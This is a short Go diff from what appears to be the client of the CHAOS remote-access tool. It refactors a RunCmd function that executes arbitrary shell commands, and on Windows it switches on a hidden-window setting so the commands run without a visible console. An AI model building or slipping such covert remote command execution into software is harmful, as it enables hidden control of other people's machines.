@@ -1,9 +1,10 @@
-package util
+package os
 
 import (
 	"context"
 	"fmt"
 	"github.com/tiagorlampert/CHAOS/client/app/models"
+	"github.com/tiagorlampert/CHAOS/client/app/util"
 	"github.com/tiagorlampert/CHAOS/client/app/util/network"
 	"os"
 	"os/exec"
@@ -31,15 +32,15 @@ func RunCmd(cmd string, timeout time.Duration) ([]byte, error) {
 	ctx, cancel := context.WithTimeout(context.Background(), timeout*time.Second)
 	defer cancel()
 
-	osType := DetectOS()
+	osType := util.DetectOS()
 	var cmdExec *exec.Cmd
 	switch osType {
-	case Windows:
+	case util.Windows:
 		cmdExec = exec.CommandContext(ctx, "cmd", "/C", cmd)
-		//cmdExec.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-	case Linux:
+		cmdExec.SysProcAttr = GetHideWindowParam()
+	case util.Linux:
 		cmdExec = exec.CommandContext(ctx, "sh", "-c", cmd)
-	case Darwin:
+	case util.Darwin:
 		cmdExec = exec.CommandContext(ctx, "sh", "-c", cmd)
 	default:
 		return nil, fmt.Errorf("os not supported")
